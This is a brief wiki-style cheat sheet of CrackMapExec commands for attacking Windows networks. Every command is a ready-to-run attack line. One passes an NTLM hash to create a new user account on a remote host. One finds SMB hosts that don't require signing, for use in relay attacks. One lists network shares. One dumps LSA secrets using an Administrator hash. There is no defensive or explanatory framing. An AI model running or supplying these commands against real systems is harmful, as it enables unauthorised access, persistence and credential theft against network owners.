<!-- TITLE: Crackmapexec -->
<!-- SUBTITLE: A quick summary of Crackmapexec -->

# Common CME Runs
## How to execute commands
```text
./crackmapexec.py smb 192.168.10.25 -d . -u compromiseduser -H aad3LMPORTION04eeaad3b435b51404ee:729bb174dNTLMPORTION2f6cd816f377 -x 'net user summit ae2rpw4U!! /add'  
```

## Find Hosts that don't require signing
```
crackmapexec.py smb 192.168.10.0/24 --gen-relay-list targets2
```

## Show me the shares on the network
```
crackmapexec.py smb hostnames.txt --shares
```

## Get some more secrets
```
cme smb TARGET -u Administrator -H <hash> --local-auth --lsa
```
